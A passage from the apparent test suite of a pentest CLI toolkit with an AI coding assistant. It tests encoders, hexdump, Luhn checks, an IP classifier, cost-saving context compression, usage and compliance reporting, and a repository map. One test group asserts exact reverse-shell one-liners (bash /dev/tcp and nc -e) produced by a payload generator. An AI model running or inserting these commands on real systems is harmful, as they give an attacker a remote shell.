  ok("statusClass boundaries", statusClass(199) === "1xx informational" && statusClass(200) === "2xx success" && statusClass(399) === "3xx redirect" && statusClass(500) === "5xx server error" && statusClass(600) === "");
}

group("reverse-shell payloads");
{
  const { SHELLS, revshell, shellLangs } = require("../lib/toolkit/revshell");
  ok("langs present", shellLangs().length >= 7 && shellLangs().includes("bash") && shellLangs().includes("powershell"));
  eq("bash exact", revshell("bash", "10.10.14.7", "4444"), "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1");
  eq("nc exact", revshell("nc", "10.10.14.7", "4444"), "nc -e /bin/sh 10.10.14.7 4444");
  ok("ip + port interpolated into every payload", shellLangs().every((l) => { const s = revshell(l, "1.2.3.4", "9001"); return s.includes("1.2.3.4") && s.includes("9001"); }));
  ok("unknown lang falls back to bash", revshell("nope", "5.6.7.8", "1234") === revshell("bash", "5.6.7.8", "1234"));
  ok("SHELLS entries are builder functions", Object.values(SHELLS).every((f) => typeof f === "function"));
}

group("hexdump");
{
  const d = hexdump("Hello world\n");
  ok("offset + hex + ascii gutter", d.split("\n")[0].startsWith("00000000  48 65 6c 6c 6f 20 77 6f  72 6c 64 0a"));
  ok("ascii shows printable, dots for control", d.includes("|Hello world.|"));
  ok("empty input note", hexdump("") === "(empty)");
  ok("16 bytes per row", hexdump("0123456789abcdefX").split("\n").length === 3); // 2 data rows + trailing offset
  ok("trailing total-length offset line", hexdump("abc").split("\n").pop() === "00000003");
}

group("strings extraction");
{
  const buf = Buffer.from([0x00, 0x41, 0x42, 0x43, 0x44, 0x01, 0x02, 0x68, 0x69]);
  const s = extractStrings(buf, 4);
  eq("finds run >= min, drops short", s.map((x) => x.text), ["ABCD"]);
  eq("offset is the run start", s[0].offset, 1);
  eq("min length respected", extractStrings("ab cd ef", 3).map((x) => x.text), ["ab cd ef"]);
  ok("min default is 4", extractStrings("hey").length === 0 && extractStrings("heyo").length === 1);
  eq("multiple runs", extractStrings(Buffer.from("AAAA\x00BBBB"), 4).map((x) => x.text), ["AAAA", "BBBB"]);
}

group("luhn checksum");
{
  ok("valid test card", luhnValid("4539148803436467"));
  ok("valid with separators", luhnValid("4539 1488 0343 6467"));
  ok("invalid card", !luhnValid("4539148803436460"));
  ok("non-digit rejected", !luhnValid("hello"));
  ok("empty rejected", !luhnValid(""));
  eq("check digit completes a valid number", luhnCheckDigit("453914880343646"), 7);
  ok("computed check digit validates", luhnValid("453914880343646" + luhnCheckDigit("453914880343646")));
  ok("check digit non-digit -> null", luhnCheckDigit("x") === null);
}

group("base58 (bitcoin alphabet)");
{
  eq("known vector 'Hello World!'", b58encode("Hello World!"), "2NEpo7TZRRrLZSi2U");
  ok("round-trips utf8", b58decode(b58encode("darknode")).toString("utf8") === "darknode");
  eq("empty -> empty", b58encode(""), "");
  ok("leading zero bytes -> leading 1s", b58encode(Buffer.from([0, 0, 1])) === "112");
  ok("invalid char (0/O/I/l) -> null", b58decode("0OIl") === null);
  ok("wired into ENC encode/decode", ENC.base58e("hi") === b58encode("hi") && ENC.base58d(b58encode("hi")) === "hi");
}

group("xor cipher (repeating key)");
{
  eq("known: 'ABC' ^ key byte", xorEncryptHex("\x00", "ABC"), "414243"); // xor with 0 = identity hex of ABC
  ok("round-trips", xorDecryptHex("secret", xorEncryptHex("secret", "attack at dawn")) === "attack at dawn");
  ok("self-inverse on bytes", xorBytes(Buffer.from("k"), xorBytes(Buffer.from("k"), Buffer.from("data"))).toString() === "data");
  ok("empty key = identity", xorBytes(Buffer.alloc(0), Buffer.from("x")).toString() === "x");
  ok("bad hex -> null", xorDecryptHex("k", "xyz") === null);
  ok("repeating key wraps", xorEncryptHex("ab", "\x00\x00\x00\x00") === "61626162");
}

group("rot / caesar");
{
  eq("rot13 basic", rot13("Hello, World!"), "Uryyb, Jbeyq!");
  ok("rot13 is its own inverse", rot13(rot13("Darknode")) === "Darknode");
  eq("rot n=1", rot(1, "abcZ"), "bcdA");
  ok("non-letters untouched", rot(5, "a1!b") === "f1!g");
  ok("negative and >26 normalize", rot(-13, "abc") === rot(13, "abc") && rot(39, "abc") === rot(13, "abc"));
}

group("ip scope classifier");
{
  const t = (ip, scope, routable) => { const r = classifyIp(ip); ok("ipclass " + ip + " -> " + scope, r && r.scope === scope && r.routable === routable); };
  t("10.0.0.5", "private", false);
  t("172.16.0.1", "private", false);
  t("192.168.1.1", "private", false);
  t("127.0.0.1", "loopback", false);
  t("169.254.0.1", "link-local", false);
  t("100.64.0.1", "cgnat", false);
  t("203.0.113.9", "documentation", false);
  t("224.0.0.1", "multicast", false);
  t("8.8.8.8", "global", true);
  t("::1", "loopback", false);
  t("fe80::1", "link-local", false);
  t("2001:db8::1", "documentation", false);
  t("2606:4700:4700::1111", "global", true);
  ok("reverse PTR for v4", classifyIp("8.8.4.4").ptr === "4.4.8.8.in-addr.arpa");
  ok("class A/B/C", classifyIp("10.0.0.1").klass === "A" && classifyIp("172.16.0.1").klass === "B" && classifyIp("192.168.0.1").klass === "C");
  ok("garbage -> null", classifyIp("999.1.1.1") === null && classifyIp("nope") === null);
}

group("registry: new commands dispatch");
{
  const { CMD_MAP } = require("../lib/cli/registry");
  const c = { red: (s) => s, green: (s) => s, yellow: (s) => s, cyan: (s) => s, gray: (s) => s, bold: (s) => s };
  const runCmd = (name, rest) => CMD_MAP[name].run({ rest, c });
  ok("hexdump command", /48 65 6c 6c 6f/.test(runCmd("hexdump", ["Hello"])));
  ok("xxd alias maps to hexdump", CMD_MAP["xxd"] === CMD_MAP["hexdump"]);
  ok("strings -n filter", runCmd("strings", ["-n", "5", "abcd efghij"]).includes("efghij") && !runCmd("strings", ["-n", "5", "abcd efghij"]).includes("abcd\n"));
  ok("luhn valid", runCmd("luhn", ["4539148803436467"]).includes("valid"));
  ok("luhn check digit via ?", runCmd("luhn", ["453914880343646?"]).includes("7"));
  ok("xor encrypt then decrypt", (() => { const hex = runCmd("xor", ["key", "hi"]).trim(); return runCmd("xor", ["-d", "key", hex]).includes("hi"); })());
  ok("rot default 13", runCmd("rot", ["Hello"]).includes("Uryyb"));
  ok("ipclass private", runCmd("ipclass", ["10.0.0.1"]).includes("private"));
  ok("ipscope alias", CMD_MAP["ipscope"] === CMD_MAP["ipclass"]);
}

group("help reference (single source of truth)");
{
  const { COMMAND_GROUPS, documentedVerbs, renderCommands, nearestCommands } = require("../lib/cli/reference");
  ok(">=8 command groups, non-empty", COMMAND_GROUPS.length >= 8 && COMMAND_GROUPS.every((g) => g.title && g.rows.length));
  ok("every row is [left, right] strings", COMMAND_GROUPS.every((g) => g.rows.every((r) => r.length === 2 && typeof r[0] === "string" && typeof r[1] === "string")));
  // DRIFT GUARD: every documented command verb must have a real dispatch handler —
  // either an inline `cmd === "x"` branch or a lib/registry.js command entry.
  const srcFiles = ["darknode.js"].map((f) => { try { return fs.readFileSync(path.join(__dirname, "..", f), "utf8"); } catch (_) { return ""; } });
  const src = srcFiles.join("\n");
  const dispatched = new Set();
  for (const m of src.matchAll(/cmd === "([^"]+)"/g)) dispatched.add(m[1]);
  const { CMDS: REG } = require("../lib/cli/registry");
  for (const cmd of REG) for (const n of [cmd.name, ...(cmd.aliases || [])]) dispatched.add(n);
  const undocumentedDrift = [...documentedVerbs()].filter((v) => !dispatched.has(v));
  eq("no documented command lacks a handler", undocumentedDrift, []);
  // renderer: column math + dynamic cheats substitution + title coloring
  const txt = renderCommands(COMMAND_GROUPS, { color: (s) => "[" + s + "]", cheats: "aa, bb" });
  ok("renderCommands colors titles", txt.includes("    [AI & Nexus]") && txt.includes("    [Reference]"));
  ok("renderCommands substitutes __CHEATS__", txt.includes("aa, bb") && !txt.includes("__CHEATS__"));
  ok("summary column aligned (>=2 spaces, min col 34)", renderCommands([{ title: "T", rows: [["scan <host>", "x"]] }]).endsWith("scan <host>".padEnd(34) + "x"));
  ok("long left cell keeps 2-space gap", renderCommands([{ title: "T", rows: [["encode <b64|hex|url|base32> <text>", "y"]] }]).endsWith("encode <b64|hex|url|base32> <text>  y"));
  // unknown-command suggestions: prefix, subsequence and typo fallback all point at real verbs
  ok("nearestCommands: typo 'scna' -> scan", nearestCommands("scna").includes("scan"));
  ok("nearestCommands: prefix 'sca' -> scan first", nearestCommands("sca")[0] === "scan");
  ok("nearestCommands: every suggestion is a real verb", nearestCommands("hedars").every((v) => documentedVerbs().has(v)));
  ok("nearestCommands: caps at max", nearestCommands("s", 2).length <= 2);
  ok("nearestCommands: empty input -> none", nearestCommands("").length === 0);
  ok("nearestCommands: gibberish -> no bogus match", nearestCommands("zzzzqqqq").length === 0);
  ok("nearestCommands: deterministic", JSON.stringify(nearestCommands("scna")) === JSON.stringify(nearestCommands("scna")));
}

group("diceware passphrase");
{
  const { WORDS, genPassphrase, passphraseBits } = require("../lib/toolkit/passphrase");
  ok("wordlist non-trivial + unique + clean", WORDS.length >= 200 && new Set(WORDS).size === WORDS.length && WORDS.every((w) => /^[a-z]+$/.test(w)));
  // deterministic via injected rng: a fake that returns fixed indices
  const fake = (() => { let i = 0; const seq = [0, 1, 2, 3]; return () => seq[i++ % seq.length]; })();
  eq("genPassphrase deterministic with injected rng", genPassphrase(4, fake), [WORDS[0], WORDS[1], WORDS[2], WORDS[3]].join("-"));
  ok("word count honored", genPassphrase(6, () => 0).split("-").length === 6);
  ok("default is 4 words", genPassphrase(undefined, () => 0).split("-").length === 4);
  ok("all words come from the list", genPassphrase(8).split("-").every((w) => WORDS.includes(w)));
  ok("count clamped to sane bounds", genPassphrase(0, () => 0).split("-").length === 4 && genPassphrase(999, () => 0).split("-").length === 32);
  ok("entropy bits scale with words", passphraseBits(4) === Math.round(4 * Math.log2(WORDS.length)) && passphraseBits(6) > passphraseBits(4));
}

group("cost savers — squeeze + response cache");
{
  const { squeezeContext, cacheKey, cacheGet, cachePut, cacheClear, cacheStats } = require("../lib/nexus/costsave");
  const { supersedeReread } = require("../lib/nexus/costsave");
  // dedupe: same big file block inlined twice → second replaced with a marker
  const body = "x".repeat(200);
  const dup = "--- pinned: a.js ---\n" + body + "\n--- end a.js ---\n\nquestion\n\n--- context: a.js ---\n" + body + "\n--- end a.js ---";
  const sq = squeezeContext(dup);
  ok("squeeze dedupes identical inlined blocks + reports savings", sq.text.includes("already shown above") && sq.text.indexOf(body) === sq.text.lastIndexOf(body) && sq.saved > 0);
  // two DISTINCT files with byte-identical bodies must NOT collapse (key is tag+body, not body alone)
  const twoFiles = "--- context: a.js ---\n" + body + "\n--- end a.js ---\n\n--- context: b.js ---\n" + body + "\n--- end b.js ---";
  const sq2 = squeezeContext(twoFiles);
  ok("squeeze keeps distinct files with identical content (no false dedupe)", !sq2.text.includes("already shown above") && sq2.text.indexOf(body) !== sq2.text.lastIndexOf(body));
  ok("squeeze collapses blank runs + trailing spaces", squeezeContext("a  \n\n\n\nb").text === "a\n\nb");
  { const C = require("../lib/nexus/costsave");
    ok("strips ANSI colour codes", C.stripTermNoise("\x1b[32mok\x1b[0m") === "ok");
    ok("keeps only the last progress-bar repaint", C.stripTermNoise(" 10%\r 50%\r100%\nnext") === "100%\nnext");
    ok("CRLF line endings are not treated as redraws", C.stripTermNoise("a\r\nb\r\n") === "a\nb\n");
    ok("source with an escaped x1b literal is untouched", C.stripTermNoise('const e = "\\x1b[0m";') === 'const e = "\\x1b[0m";');
    ok("squeeze drops terminal noise from inlined logs", squeezeContext("\x1b[31merror\x1b[0m").text === "error");
    ok("cache key ignores CRLF + trailing spaces", cacheKey("c", "m", "fix it  \r\n") === cacheKey("c", "m", "fix it"));
    ok("cache key keeps interior spacing + case", cacheKey("c", "m", "a  b") !== cacheKey("c", "m", "a b") && cacheKey("c", "m", "Fix") !== cacheKey("c", "m", "fix")); }
  ok("squeeze leaves clean small text untouched (no savings)", squeezeContext("hello world").saved === 0);
  ok("cacheKey stable + sensitive to engine/model/prompt", cacheKey("ollama", "m", "p") === cacheKey("ollama", "m", "p") && cacheKey("ollama", "m", "p") !== cacheKey("ollama", "m2", "p") && cacheKey("ollama", "m", "p") !== cacheKey("ollama", "m", "p2"));
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-cache-"));
  const k = cacheKey("ollama", "m", "hi");
  ok("cacheGet on empty → null", cacheGet(dir, k) === null);
  cachePut(dir, k, { text: "answer", inTok: 100, outTok: 50, cost: 0.01, readonly: true, hits: 0, ts: 1 });
  ok("cachePut + cacheGet round-trip", (cacheGet(dir, k) || {}).text === "answer");
  ok("cacheGet honours TTL (expired → null)", (() => { const f = path.join(dir, ".nexus", "cache", k + ".json"); const past = new Date(Date.now() - 3600000); fs.utimesSync(f, past, past); return cacheGet(dir, k, 60000) === null && cacheGet(dir, k, 999999999) !== null; })());
  cachePut(dir, k, { text: "answer", inTok: 100, outTok: 50, cost: 0.01, readonly: true, hits: 3, ts: 1 });
  const st = cacheStats(dir);
  ok("cacheStats tallies entries + hit-weighted savings", st.entries === 1 && st.hits === 3 && st.savedTok === 450 && Math.abs(st.savedCost - 0.03) < 1e-9);
  cacheClear(dir);
  ok("cacheClear wipes the cache dir", cacheGet(dir, k) === null && cacheStats(dir).entries === 0);
  try { fs.rmSync(dir, { recursive: true, force: true }); } catch (_) {}

  // supersedeReread — lossless re-read compression
  {
    const big = "y".repeat(500);
    const msgs = [ { role: "assistant", content: "{}" }, { role: "tool", content: big } ];
    const snap = new Map(); const FP = "/w/a.js";
    const s1 = supersedeReread(msgs, snap, FP, "a.js", 1);
    ok("first read is just recorded (nothing to supersede)", s1 === 0 && msgs[1].content === big && snap.get(FP) === 1);
    msgs.push({ role: "assistant", content: "{}" });
    msgs.push({ role: "tool", content: "z".repeat(500) });   // a fresh re-read of the same file
    const s2 = supersedeReread(msgs, snap, FP, "a.js", 3);
    ok("re-read stubs the earlier full copy + reports savings", s2 > 0 && msgs[1].content.startsWith("[superseded") && msgs[3].content.length === 500 && snap.get(FP) === 3);
    ok("the newest copy is never touched", msgs[3].content === "z".repeat(500));
    const before = msgs[1].content;
    supersedeReread(msgs, snap, FP, "a.js", 3);
    ok("an already-stubbed copy is not re-stubbed (idempotent)", msgs[1].content === before);
    const snap2 = new Map(); const msgs2 = [ { role: "tool", content: "short" }, { role: "tool", content: "q".repeat(300) } ];
    snap2.set("/w/b.js", 0);
    ok("a too-small earlier copy is left alone", supersedeReread(msgs2, snap2, "/w/b.js", "b.js", 1) === 0 && msgs2[0].content === "short");
    ok("different files don't supersede each other", (() => { const m = [{ role: "tool", content: "a".repeat(300) }, { role: "tool", content: "b".repeat(300) }]; const sn = new Map(); supersedeReread(m, sn, "/w/x.js", "x.js", 0); const r = supersedeReread(m, sn, "/w/y.js", "y.js", 1); return r === 0 && m[0].content === "a".repeat(300); })());
    ok("safe on bad input", supersedeReread(null, snap, FP, "a.js") === 0 && supersedeReread(msgs, null, FP, "a.js") === 0);
  }
}

group("MCP catalog (/mcp add)");
{
  const { MCP_CATALOG, DEFAULT_MCP, catalogGet, catalogList, isBundled, bundledSpecs, addServerToConfig, removeServerFromConfig } = require("../lib/nexus/mcp-catalog");
  ok("catalog non-empty + every entry has a valid spec", catalogList().length >= 10 && catalogList().every((k) => { const e = MCP_CATALOG[k]; return e && e.desc && e.spec && typeof e.spec.command === "string" && Array.isArray(e.spec.args); }));
  ok("expanded catalog has 20+ servers", catalogList().length >= 20);
  ok("DEFAULT_MCP names all exist in the catalog", DEFAULT_MCP.length >= 4 && DEFAULT_MCP.every((n) => !!MCP_CATALOG[n]));
  ok("isBundled true for a default, false for a keyed server", isBundled("memory") && isBundled("FETCH") && !isBundled("github"));
  const bs = bundledSpecs();
  ok("bundledSpecs returns only no-key servers with runnable specs", Object.keys(bs).length >= 4 && Object.keys(bs).every((n) => !MCP_CATALOG[n].needsEnv && typeof bs[n].command === "string") && !("github" in bs));
  ok("blender is present with the right runner", catalogGet("blender").spec.command === "uvx" && catalogGet("blender").spec.args.includes("blender-mcp"));
  ok("catalogGet is case-insensitive + null on miss", !!catalogGet("BLENDER") && catalogGet("nope") === null);
  const c1 = addServerToConfig({ mcpServers: { keepme: { command: "x" } } }, "playwright");
  ok("addServerToConfig merges without clobbering existing", c1.mcpServers.keepme && c1.mcpServers.playwright && c1.mcpServers.playwright.command === "npx");
  ok("addServerToConfig on unknown returns null", addServerToConfig({}, "nope") === null);
  ok("addServerToConfig builds mcpServers when absent", addServerToConfig({}, "fetch").mcpServers.fetch.command === "uvx");
  const c2 = removeServerFromConfig(c1, "playwright");
  ok("removeServerFromConfig drops only the target", !c2.mcpServers.playwright && c2.mcpServers.keepme);
  ok("needsEnv/note flagged where required (github token)", (catalogGet("github").needsEnv || []).includes("GITHUB_PERSONAL_ACCESS_TOKEN"));
}

group("usage ledger + chargeback report");
{
  const { appendUsage, loadUsage, summarize, renderReport, MONEY, TOK } = require("../lib/governance/usage");
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-usage-"));
  ok("appendUsage writes + loadUsage reads", (() => {
    appendUsage(dir, { ts: "2026-08-11T09:00:00Z", engine: "claude", model: "claude-opus-4-8", inTok: 1000, outTok: 500, cost: 0.04, seconds: 10, files: 2, commands: 1 });
    appendUsage(dir, { ts: "2026-08-12T10:00:00Z", engine: "ollama", model: "qwen2.5-coder", inTok: 4000, outTok: 2000, cost: 0, seconds: 30, files: 1, commands: 2, interrupted: true });
    return loadUsage(dir).length === 2;
  })());
  ok("loadUsage since-filter", loadUsage(dir, { since: "2026-08-12" }).length === 1);
  ok("malformed ledger lines are skipped", (() => { fs.appendFileSync(path.join(dir, ".nexus", "usage.jsonl"), "not json\n"); return loadUsage(dir).length === 2; })());
  const s = summarize(loadUsage(dir));
  eq("summarize totals", [s.turns, s.inTok, s.outTok, s.files, s.commands, s.interrupted], [2, 5000, 2500, 3, 3, 1]);
  ok("summarize cost", Math.round(s.cost * 1000) / 1000 === 0.04);
  ok("byEngine + byDay breakdowns", s.byEngine.claude.turns === 1 && s.byEngine.ollama.turns === 1 && Object.keys(s.byDay).length === 2);
  ok("first/last timestamps span the ledger", s.firstTs === "2026-08-11T09:00:00Z" && s.lastTs === "2026-08-12T10:00:00Z");
  ok("summarize counts a __proto__ model without polluting Object.prototype", (() => { const r = summarize([{ ts: "2026-08-11T09:00:00Z", engine: "x", model: "__proto__", cost: 1, inTok: 2, outTok: 1 }]); return r.byModel["__proto__"] && r.byModel["__proto__"].turns === 1 && ({}).turns === undefined; })());
  ok("loadUsage on a dir with no ledger → []", loadUsage(fs.mkdtempSync(path.join(os.tmpdir(), "nexus-empty-"))).length === 0);
  const rep = renderReport(s, { project: "acme" });
  ok("report has header + cost + engine + day sections", /Nexus usage report — acme/.test(rep) && rep.includes("$0.0400") && rep.includes("claude") && rep.includes("By day"));
  eq("MONEY + TOK formatting", [MONEY(0.04), TOK(1500), TOK(2500000)], ["$0.0400", "1.5k", "2.50M"]);
  try { fs.rmSync(dir, { recursive: true, force: true }); } catch (_) {}
}

group("cost-savings analysis");
{
  const { analyzeSavings, renderSavings, MONEY } = require("../lib/governance/usage");
  // One paid opus turn (heavy output) + one free local turn, across two days.
  const recs = [
    { ts: "2026-08-11T09:00:00Z", engine: "claude", model: "claude-opus-4-8", inTok: 1_000_000, outTok: 1_000_000, cost: 90 },
    { ts: "2026-08-12T10:00:00Z", engine: "ollama", model: "qwen2.5-coder", inTok: 5000, outTok: 2000, cost: 0 },
  ];
  const a = analyzeSavings(recs);
  ok("splits paid vs free turns", a.paidTurns === 1 && a.freeTurns === 1 && Math.round(a.paidCost) === 90);
  ok("run-rate over 2 active days → 30d projection", a.activeDays === 2 && Math.round(a.dailyAvg) === 45 && Math.round(a.projected30) === 1350);
  ok("local lever = fraction of paid cost (default 30%)", a.localFrac === 0.30 && Math.round(a.localSaved) === 27);
  ok("mechanicalFraction override honored + clamped", Math.round(analyzeSavings(recs, { mechanicalFraction: 0.5 }).localSaved) === 45 && analyzeSavings(recs, { mechanicalFraction: 9 }).localFrac === 1);
  // opus 4.8: 1M in @ $5 + 1M out @ $25 = $30; same tokens on sonnet 5.5 ($2/$10) = $12 → save $18.
  const opus = a.byModel.find((m) => /opus/.test(m.model));
  ok("opus downshifts to sonnet with correct saving", opus.downshift.to === "sonnet" && Math.round(opus.downshift.altCost) === 12 && Math.round(opus.downshift.saved) === 18);
  ok("free/local model has no downshift", a.byModel.find((m) => /qwen/.test(m.model)).downshift === null);
  ok("totalSavable = local + downshift", Math.round(a.totalSavable) === Math.round(a.localSaved + a.downshiftSaved));
  const txt = renderSavings(a, { project: "acme" });
  ok("renders headline + opportunities + downshift table", /cost-savings analysis — acme/.test(txt) && txt.includes("Run rate") && txt.includes("Local routing") && txt.includes("→ sonnet"));
  ok("empty ledger → zeroed analysis, no crash", (() => { const z = analyzeSavings([]); return z.turns === 0 && z.totalSavable === 0 && z.activeDays === 1; })());
}

group("operator/team attribution");
{
  const { resolveOperator } = require("../lib/governance/identity");
  const { summarize, renderReport } = require("../lib/governance/usage");
  // env (SSO-provisioned) wins
  eq("env identity wins", resolveOperator({ env: { DARKNODE_OPERATOR: "alice", DARKNODE_TEAM: "platform" }, cwd: os.tmpdir() }), { operator: "alice", team: "platform", source: "sso-env" });
  // local config fallback
  const d = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-id-")); fs.mkdirSync(path.join(d, ".nexus"));
  fs.writeFileSync(path.join(d, ".nexus", "identity.json"), JSON.stringify({ operator: "bob", team: "payments" }));
  eq("config identity when env is empty", resolveOperator({ env: {}, cwd: d }), { operator: "bob", team: "payments", source: "config" });
  ok("OS-user fallback never blank", (() => { const r = resolveOperator({ env: {}, cwd: os.tmpdir() }); return r.operator && r.source === "os"; })());
  // attribution rolls up per operator + team
  const recs = [
    { ts: "2026-08-12T09:00:00Z", engine: "claude", model: "opus", inTok: 100, outTok: 50, cost: 0.05, operator: "alice", team: "platform" },
    { ts: "2026-08-12T10:00:00Z", engine: "claude", model: "opus", inTok: 80, outTok: 40, cost: 0.03, operator: "bob", team: "payments" },
    { ts: "2026-08-12T11:00:00Z", engine: "ollama", model: "qwen", inTok: 500, outTok: 200, cost: 0, operator: "alice", team: "platform" },
  ];
  const s = summarize(recs);
  ok("byOperator rollup", s.byOperator.alice.turns === 2 && Math.round(s.byOperator.alice.cost * 100) / 100 === 0.05 && s.byOperator.bob.turns === 1);
  ok("byTeam rollup", s.byTeam.platform.turns === 2 && s.byTeam.payments.turns === 1);
  ok("report shows team + operator sections when multiple", (() => { const r = renderReport(s, { project: "x" }); return r.includes("By team") && r.includes("By operator") && r.includes("alice") && r.includes("payments"); })());
  try { fs.rmSync(d, { recursive: true, force: true }); } catch (_) {}
}

group("compliance bundle (SOC2 export)");
{
  const { buildBundle, verifyBundle, renderBundleMd, sha256 } = require("../lib/governance/compliance");
  const d = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-comp-")); fs.mkdirSync(path.join(d, ".nexus"));
  fs.writeFileSync(path.join(d, ".nexus", "usage.jsonl"), JSON.stringify({ ts: "2026-08-12T10:00:00Z", engine: "claude", model: "opus", inTok: 100, outTok: 50, cost: 0.02, operator: "alice", team: "platform" }) + "\n");
  fs.writeFileSync(path.join(d, ".nexus", "policy.json"), JSON.stringify({ protectedPaths: [".env"], audit: true }));
  const b = buildBundle(d, { operator: "alice", team: "platform", now: "2026-08-12T12:00:00Z", signingKey: "secret" });
  eq("bundle metadata", [b.kind, b.version, b.generatedAt, b.operator, b.team], ["darknode.compliance.bundle", 1, "2026-08-12T12:00:00Z", "alice", "platform"]);
  ok("bundle carries usage + manifest digests", b.usage.turns === 1 && b.manifest["usage.jsonl"].sha256.length === 64 && b.manifest["policy.json"]);
  ok("integrity + signature present", b.integrity.algo === "sha256" && b.integrity.hash.length === 64 && b.signature.algo === "hmac-sha256");
  eq("verify a good signed bundle", verifyBundle(b, "secret"), { hashOk: true, sigOk: true });
  ok("wrong key fails signature but hash still ok", (() => { const v = verifyBundle(b, "nope"); return v.hashOk === true && v.sigOk === false; })());
  ok("tampering breaks integrity + signature", (() => { const t = JSON.parse(JSON.stringify(b)); t.usage.cost = 999; const v = verifyBundle(t, "secret"); return v.hashOk === false && v.sigOk === false; })());
  ok("unsigned bundle: sigOk is null", (() => { const u = buildBundle(d, { operator: "alice", now: "2026-08-12T12:00:00Z" }); return u.signature === undefined && verifyBundle(u).sigOk === null && verifyBundle(u).hashOk === true; })());
  ok("markdown render has the key sections", (() => { const md = renderBundleMd(b); return md.includes("# Darknode compliance report") && md.includes("Operator:** alice") && md.includes("Manifest (SHA-256)") && md.includes(b.integrity.hash); })());
  ok("deterministic with fixed now + injected key", buildBundle(d, { operator: "alice", team: "platform", now: "2026-08-12T12:00:00Z", signingKey: "secret" }).integrity.hash === b.integrity.hash);
  try { fs.rmSync(d, { recursive: true, force: true }); } catch (_) {}
}

{
  const { codexLocal } = require("../lib/nexus/codex-local");
  const d = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-codex-"));
  fs.writeFileSync(path.join(d, "config.toml"), 'model = "gpt-a"\nmodel_reasoning_effort = "low"\n[profiles.fast]\nmodel = "gpt-profile"\n');
  fs.writeFileSync(path.join(d, "models_cache.json"), JSON.stringify({ models: [{ slug: "gpt-b", visibility: "list", priority: 9 }, { slug: "hidden", visibility: "hide", priority: 1 }, { slug: "gpt-a", visibility: "list", priority: 2 }] }));
  fs.writeFileSync(path.join(d, "auth.json"), JSON.stringify({ auth_mode: "chatgpt", OPENAI_API_KEY: null, tokens: { access_token: "SECRET" } }));
  const c = codexLocal(d);
  eq("codex default model from top-level config, not a profile", c.model, "gpt-a");
  eq("codex models: listed only, by priority", c.models, ["gpt-a", "gpt-b"]);
  eq("codex auth mode", c.authMode, "chatgpt");
  ok("codex tokens never read out", !JSON.stringify(c).includes("SECRET"));
  eq("codex missing home keeps defaults", codexLocal(path.join(d, "none")), { model: "", models: [], authMode: "" });
  try { fs.rmSync(d, { recursive: true, force: true }); } catch (_) {}
}

{
  const { buildRepoMap, renderRepoMap, extractSymbols, isSourceFile, scoreFile, findSymbol } = require("../lib/nexus/repo-map");
  // symbol extraction per language
  eq("js: function + class + arrow const", extractSymbols("a.js", "export function foo(){}\nclass Bar{}\nconst baz = () => 1\n").map((s) => s.kind + ":" + s.name), ["fn:foo", "class:Bar", "fn:baz"]);
  eq("py: def + class with line numbers", extractSymbols("x.py", "import os\n\ndef run(x):\n    pass\nclass Widget:\n    pass\n").map((s) => s.kind + ":" + s.name + "@" + s.line), ["fn:run@3", "class:Widget@5"]);
  eq("go: func + type struct", extractSymbols("m.go", "func main(){}\ntype Server struct{}\nfunc (s *Server) Do(){}\n").map((s) => s.kind + ":" + s.name), ["fn:main", "type:Server", "fn:Do"]);
  eq("ts: interface + type alias beyond js", extractSymbols("t.ts", "interface Opt{}\ntype Id = string\nfunction q(){}\n").map((s) => s.kind + ":" + s.name), ["type:Opt", "type:Id", "fn:q"]);
  eq("unknown extension yields no symbols", extractSymbols("data.bin", "func x(){}"), []);
  ok("dedups repeated names", extractSymbols("a.js", "function foo(){}\nfunction foo(){}\n").length === 1);
  ok("skips absurdly long (minified) lines", extractSymbols("a.js", "function keep(){}\n" + "x".repeat(500) + "function skip(){}\n").length === 1);
  // ignore rules
  ok("node_modules is not a source file", !isSourceFile("node_modules/x/index.js"));
  ok("lockfile is not a source file", !isSourceFile("package-lock.json"));
  ok("minified bundle is not a source file", !isSourceFile("dist/app.min.js"));
  ok("binary by extension is not a source file", !isSourceFile("assets/logo.png"));
  ok("plain source file is kept", isSourceFile("src/core/game.js"));
  // ranking: an entry point with symbols beats a deep test file
  ok("entry point outranks a test file", scoreFile({ path: "index.js", symbols: [{}, {}] }) > scoreFile({ path: "src/deep/nested/util.test.js", symbols: [{}, {}] }));
  // full build + render
  const files = [
    { path: "./src/index.js", content: "export function main(){ return 1 }\nclass App {}\n" },
    { path: "node_modules/lib/a.js", content: "function ignored(){}" },
    { path: "package-lock.json", content: "{}" },
    { path: "test/index.test.js", content: "function testThing(){}" },
    { path: "src/util.py", content: "def helper():\n    pass\n" },
  ];
  const map = buildRepoMap(files);
  eq("build ignores node_modules + lockfiles", map.fileCount, 3);
  ok("counts symbols across languages", map.symbolCount === 4);
  ok("languages tallied", map.languages.js === 2 && map.languages.py === 1);
  eq("normalizes ./ prefix and ranks entry point first", map.files[0].path, "src/index.js");
  const txt = renderRepoMap(map, { maxFiles: 10, maxSymbols: 5 });
  ok("render has header + entry file + symbol", /Repository map: 3 source files/.test(txt) && txt.includes("src/index.js") && txt.includes("main"));
  ok("render marks classes/types with *", txt.includes("App*"));
  eq("empty map renders a placeholder", renderRepoMap(buildRepoMap([])), "(empty repository map)");
  ok("deterministic output", renderRepoMap(buildRepoMap(files)) === renderRepoMap(buildRepoMap(files)));
  // symbol navigation
  const m2 = buildRepoMap([
    { path: "src/a.js", content: "function handleRequest(){}\nfunction other(){}\n" },
    { path: "src/b.js", content: "const handleRequestRetry = () => {}\n" },
  ]);
  eq("findSymbol exact def first", findSymbol(m2, "handleRequest")[0], { path: "src/a.js", name: "handleRequest", kind: "fn", line: 1 });
  ok("findSymbol substring is ranked after exact", (() => { const r = findSymbol(m2, "handleRequest"); return r.length === 2 && r[1].name === "handleRequestRetry"; })());
  eq("findSymbol is case-insensitive", findSymbol(m2, "HANDLEREQUEST")[0].name, "handleRequest");
  eq("findSymbol miss returns empty", findSymbol(m2, "nope"), []);
  ok("findSymbol ignores 1-2 char fuzzy noise", findSymbol(m2, "h").length === 0);
}

{
  group("code-intel (find_references)");
  const { findReferences, classifyLine } = require("../lib/nexus/code-intel");
  const files = [
    { path: "src/util.js", content: "export function parse(x){ return x }\nconst y = parse(1)\n" },
    { path: "src/app.js", content: "import { parse } from './util'\nconsole.log(parse(2))\nconst parsed = parse(3)\n// parse comment mentions parse\n" },
